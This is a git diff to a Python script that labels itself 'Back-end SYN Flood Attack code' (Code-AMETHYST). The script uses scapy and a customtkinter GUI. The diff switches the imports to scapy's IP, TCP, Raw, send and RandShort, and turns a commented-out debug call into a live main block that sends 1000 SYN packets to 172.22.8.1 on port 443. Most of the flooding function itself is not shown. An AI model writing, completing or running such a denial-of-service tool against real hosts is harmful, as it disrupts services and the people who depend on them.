@@ -1,8 +1,11 @@
-# Code-AMETHYST ver2.4
+# Code-AMETHYST ver2.7
 # Back-end SYN Flood Attack code
 
 # Modules
-from head import IP, TCP, Raw, send, RandShort
+from scapy.layers.inet import IP, TCP
+from scapy.packet import Raw
+from scapy.sendrecv import send
+from scapy.volatile import RandShort
 import customtkinter as ctk
 
 # Functions
@@ -28,8 +31,9 @@ def send_syn(target_ip: str, target_port: int, total_packets: int, label: ctk.CT
     if count == 0:
         label.configure(text="FREE", text_color="lime")
 
-# For debugging purposes, use the code below
+# For debugging
+if __name__ == "__main__":
+    ip = "172.22.8.1"
+    port = 443
 
-# ip = "172.22.8.1"
-# port = 443
-# send_syn(ip, port, total_packets=1000)
+    send_syn(ip, port, total_packets=1000)
